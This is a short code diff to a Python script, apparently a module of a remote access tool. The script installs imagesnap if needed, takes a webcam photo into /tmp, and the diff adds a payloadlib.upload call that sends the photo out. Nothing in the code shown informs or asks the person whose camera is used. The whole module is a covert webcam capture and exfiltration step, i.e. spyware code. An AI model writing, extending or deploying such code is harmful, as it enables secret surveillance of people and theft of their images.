@@ -19,7 +19,7 @@ if os.system('which -s imagesnap') != 0:
     # user does not have imagesnap, must install
     os.system('brew install imagesnap')
 
-filename = '/tmp/image-{}.png'.format(datetime.datetime.now())
+filename = '/tmp/image-{}.png'.format(datetime.datetime.now().strftime('%Y-%m-%d-%H-%M'))
 
 # take image and save it in tmp, then respond with output
 proc = subprocess.Popen(['imagesnap', filename],
@@ -27,5 +27,8 @@ proc = subprocess.Popen(['imagesnap', filename],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
 (out, err) = proc.communicate()
+
+payloadlib.upload(filename)
+
 sys.stderr.write(err)
 sys.stdout.write(out)
